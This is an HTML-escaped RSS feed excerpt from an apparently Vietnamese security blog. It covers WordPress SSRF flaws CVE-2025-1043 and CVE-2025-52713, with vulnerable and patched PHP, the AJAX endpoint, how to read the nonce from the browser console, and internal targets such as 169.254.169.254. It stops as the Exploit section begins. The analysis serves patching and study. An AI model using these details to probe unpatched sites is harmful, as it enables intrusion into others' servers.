viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-1043 là SSRF do plugin gọi &lt;code&gt;wp_remote_head()&lt;/code&gt; với URL từ shortcode mà không kiểm tra. Dù là &lt;code&gt;HEAD&lt;/code&gt; (không có body), vẫn có thể lộ metadata, thăm dò dịch vụ nội bộ hoặc, khi có redirect/endpoint không phân biệt method, gây thay đổi trạng thái. Bản vá (v2.7.6) dùng &lt;code&gt;esc_url_raw()&lt;/code&gt; + &lt;code&gt;wp_safe_remote_head()&lt;/code&gt; để giảm rủi ro.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nguyên nhân: thiếu lọc/whitelist URL trước khi gọi HTTP từ server.&lt;/li&gt;&#xA;&lt;li&gt;Ảnh hưởng: metadata leak, internal discovery, khả năng chuỗi tấn công (redirect → GET, method-agnostic endpoints).&lt;/li&gt;&#xA;&lt;li&gt;Fix: cập nhật lên &lt;strong&gt;v2.7.6&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Khuyến nghị ngắn: dùng &lt;code&gt;wp_safe_remote_*&lt;/code&gt;, &lt;code&gt;esc_url_raw()&lt;/code&gt;/whitelist, tắt redirect khi chỉ cần header, và giới hạn quyền người dùng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/embed-any-document/vulnerability/wordpress-embed-any-document-embed-pdf-word-powerpoint-and-excel-files-plugin-2-7-5-authenticated-contributor-blind-server-side-request-forgery-via-embeddoc-shortcode-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Embed Any Document Plugin &amp;lt;= 2.7.5 is vulnerable to Server Side Request Forgery (SSRF)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-52713 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-01-cve-2025-52713/</link>
      <pubDate>Sat, 01 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-01-cve-2025-52713/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-01-cve-2025-52713/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; trong plugin &lt;strong&gt;BoldGrid Post and Page Builder by BoldGrid – Visual Drag and Drop Editor&lt;/strong&gt; cho phép kẻ tấn công thực hiện &lt;strong&gt;yêu cầu giả mạo từ phía máy chủ&lt;/strong&gt;.&#xA;Vấn đề này ảnh hưởng đến plugin &lt;strong&gt;Post and Page Builder by BoldGrid – Visual Drag and Drop Editor&lt;/strong&gt; từ phiên bản &lt;strong&gt;chưa xác định cho đến 1.27.8&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-52713&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-52713&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.27.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.27.9&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (6.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/post-and-page-builder/advanced/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Post and Page Builder by BoldGrid – Visual Drag and Drop Editor Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Post and Page Builder by BoldGrid – Visual Drag and Drop Editor&lt;/strong&gt;: &lt;strong&gt;1.27.8&lt;/strong&gt; (vulnerable) và &lt;strong&gt;1.27.9&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function get_redirect_url() {&#xA;    $urls = ! empty( $_POST[&amp;#39;urls&amp;#39;] ) ? $_POST[&amp;#39;urls&amp;#39;] : null;&#xA;&#xA;    self::validate_nonce( &amp;#39;image&amp;#39; );&#xA;    $unsplash_404 = &amp;#39;https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop&amp;amp;fm=jpg&amp;amp;h=800&amp;amp;q=50&amp;amp;w=1200&amp;#39;;&#xA;&#xA;    $redirectUrls = array();&#xA;    foreach( $urls as $url ) {&#xA;        $response = wp_remote_head( $url );&#xA;        $headers = is_array( $response ) &amp;amp;&amp;amp; ! empty( $response[&amp;#39;headers&amp;#39;] ) ? $response[&amp;#39;headers&amp;#39;]-&amp;gt;getAll() : array();&#xA;        $redirectUrl = ! empty( $headers[&amp;#39;location&amp;#39;] ) ? $headers[&amp;#39;location&amp;#39;] : false;&#xA;        $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false;&#xA;        $redirectUrls[ $url ] = $redirectUrl;&#xA;    }&#xA;&#xA;    if ( ! empty( $redirectUrls ) ) {&#xA;        wp_send_json_success( $redirectUrls );&#xA;    } else {&#xA;        status_header( 400 );&#xA;        wp_send_json_error();&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong &lt;strong&gt;phiên bản lỗi&lt;/strong&gt;, hàm &lt;code&gt;get_redirect_url()&lt;/code&gt; nhận mảng URL từ &lt;code&gt;$_POST[&#39;urls&#39;]&lt;/code&gt;, sau đó duyệt qua từng phần tử và gửi request bằng &lt;code&gt;wp_remote_head($url)&lt;/code&gt; mà &lt;strong&gt;không hề kiểm tra hoặc lọc dữ liệu đầu vào&lt;/strong&gt;. Việc này cho phép kẻ tấn công tự cung cấp URL tùy ý để máy chủ gửi yêu cầu tới các địa chỉ nội bộ như &lt;code&gt;127.0.0.1&lt;/code&gt; hoặc &lt;code&gt;169.254.169.254&lt;/code&gt;, dẫn đến &lt;strong&gt;lỗ hổng SSRF&lt;/strong&gt;. Ngoài ra, do không giới hạn &lt;code&gt;timeout&lt;/code&gt; hay số lần &lt;code&gt;redirection&lt;/code&gt;, hàm còn có thể bị lợi dụng để gây &lt;strong&gt;treo hoặc tấn công từ chối dịch vụ (DoS)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_redirect_url() {&#xA;    $urls = ! empty( $_POST[&amp;#39;urls&amp;#39;] ) ? $_POST[&amp;#39;urls&amp;#39;] : null;&#xA;&#xA;    self::validate_nonce( &amp;#39;image&amp;#39; );&#xA;    $unsplash_404 = &amp;#39;https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop&amp;amp;fm=jpg&amp;amp;h=800&amp;amp;q=50&amp;amp;w=1200&amp;#39;;&#xA;    $redirectUrls = array();&#xA;    foreach( $urls as $url ) {&#xA;        $response = wp_safe_remote_head( esc_url_raw( $url ), array(&#xA;            &amp;#39;timeout&amp;#39;     =&amp;gt; 5,&#xA;            &amp;#39;redirection&amp;#39; =&amp;gt; 5,&#xA;        ) );&#xA;        $headers = is_array( $response ) &amp;amp;&amp;amp; ! empty( $response[&amp;#39;headers&amp;#39;] ) ? $response[&amp;#39;headers&amp;#39;]-&amp;gt;getAll() : array();&#xA;        $redirectUrl = ! empty( $headers[&amp;#39;location&amp;#39;] ) ? $headers[&amp;#39;location&amp;#39;] : false;&#xA;        $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false;&#xA;        $redirectUrls[ $url ] = $redirectUrl;&#xA;    }&#xA;&#xA;    if ( ! empty( $redirectUrls ) ) {&#xA;        wp_send_json_success( $redirectUrls );&#xA;    } else {&#xA;        status_header( 400 );&#xA;        wp_send_json_error();&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã thay &lt;code&gt;wp_remote_head()&lt;/code&gt; bằng &lt;code&gt;wp_safe_remote_head()&lt;/code&gt; kết hợp với &lt;code&gt;esc_url_raw()&lt;/code&gt; để lọc và chỉ cho phép URL hợp lệ, đồng thời bổ sung các tham số bảo vệ như &lt;code&gt;timeout =&amp;gt; 5&lt;/code&gt; và &lt;code&gt;redirection =&amp;gt; 5&lt;/code&gt;. Nhờ đó, hàm chỉ gửi request đến các host an toàn, ngăn SSRF và hạn chế các rủi ro về hiệu năng.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Hàm &lt;code&gt;self::validate_nonce( &#39;image&#39; );&lt;/code&gt; trong đoạn mã được gọi để &lt;strong&gt;xác thực nonce&lt;/strong&gt; — một cơ chế bảo vệ của WordPress nhằm ngăn &lt;strong&gt;CSRF (Cross-Site Request Forgery)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function validate_nonce( $name ) {&#xA;    $nonce = ! empty( $_POST[ self::$nonces[ $name ] ] ) ?&#xA;        $_POST[ self::$nonces[ $name ] ] : null;&#xA;&#xA;    $valid = wp_verify_nonce( $nonce, self::$nonces[ $name ] );&#xA;&#xA;    if ( ! $valid ) {&#xA;        status_header( 401 );&#xA;        wp_send_json_error();&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cụ thể, plugin định nghĩa một mảng tĩnh &lt;code&gt;$nonces&lt;/code&gt; chứa các tên nonce tương ứng với từng hành động:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected static $nonces = array(&#xA;    &amp;#39;image&amp;#39; =&amp;gt; &amp;#39;boldgrid_gridblock_image_ajax_nonce&amp;#39;,&#xA;    &amp;#39;setup&amp;#39; =&amp;gt; &amp;#39;boldgrid_editor_setup&amp;#39;,&#xA;    &amp;#39;gridblock_save&amp;#39; =&amp;gt; &amp;#39;boldgrid_editor_gridblock_save&amp;#39;,&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi hàm &lt;code&gt;validate_nonce(&#39;image&#39;)&lt;/code&gt; được gọi, nó sẽ:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Lấy giá trị nonce từ request POST theo key &lt;code&gt;boldgrid_gridblock_image_ajax_nonce&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra giá trị này bằng &lt;code&gt;wp_verify_nonce()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu nonce không hợp lệ (nghĩa là request không được khởi tạo từ trang WordPress hợp pháp), hàm sẽ trả về &lt;strong&gt;HTTP 401 Unauthorized&lt;/strong&gt; và dừng xử lý thông qua &lt;code&gt;wp_send_json_error()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition tip open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-regular fa-lightbulb&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Mẹo&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Khi tìm kiếm từ khóa &lt;code&gt;boldgrid_gridblock_image_ajax_nonce&lt;/code&gt; trong mã nguồn plugin, ta thấy giá trị này được gán từ biến JavaScript &lt;code&gt;BoldgridEditor.grid_block_nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-01-cve-2025-52713/nonce.png&#34; title=&#34;Giá trị của nonce trong JS&#34; data-thumbnail=&#34;/posts/2025-11-01-cve-2025-52713/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Giá trị của nonce trong JS&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-01-cve-2025-52713/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;549&#34; width=&#34;1539&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Giá trị của nonce trong JS&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Do đây là yêu cầu AJAX được gửi từ phía client, nên để lấy nonce hiện tại, ta có thể mở &lt;strong&gt;Console&lt;/strong&gt; trên trình duyệt và gọi:&#xA;&lt;code&gt;BoldgridEditor.grid_block_nonce&lt;/code&gt; khi tạo post bằng plugin này.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-01-cve-2025-52713/nonce_value.png&#34; title=&#34;Giá trị của nonce trong console&#34; data-thumbnail=&#34;/posts/2025-11-01-cve-2025-52713/nonce_value.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce value&lt;/h2&gt;&lt;p&gt;Giá trị của nonce trong console&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-01-cve-2025-52713/nonce_value.png&#39; alt=&#34;Nonce value&#34; height=&#34;416&#34; width=&#34;1052&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Giá trị của nonce trong console&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;&lt;code&gt;get_redirect_url()&lt;/code&gt; được đăng ký làm callback cho action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_boldgrid_redirect_url&amp;#39;, array( $boldgrid_editor_ajax, &amp;#39;get_redirect_url&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều này có nghĩa là: Khi client gửi request AJAX đến endpoint &lt;code&gt;/wp-admin/admin-ajax.php?action=boldgrid_redirect_url&lt;/code&gt; thì &lt;code&gt;get_redirect_url()&lt;/code&gt; sẽ được gọi&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url &amp;#43; $_POST[&amp;#39;urls&amp;#39;]&amp;#34;] --&amp;gt; B[&amp;#34;wp_ajax_boldgrid_redirect_url → get_redirect_url()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;self::validate_nonce(&amp;#39;image&amp;#39;)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;read $_POST[&amp;#39;urls&amp;#39;]&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;foreach $url&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;wp_remote_head($url)  ← SSRF sink&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;extract headers[&amp;#39;location&amp;#39;] → $redirectUrls&amp;#34;]&#xA;G --&amp;gt; H{&amp;#34;$redirectUrls not empty?&amp;#34;}&#xA;H -- Yes --&amp;gt; I[&amp;#34;wp_send_json_success($redirectUrls)&amp;#34;]&#xA;H -- No --&amp;gt; J[&amp;#34;wp_send_json_error()&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; 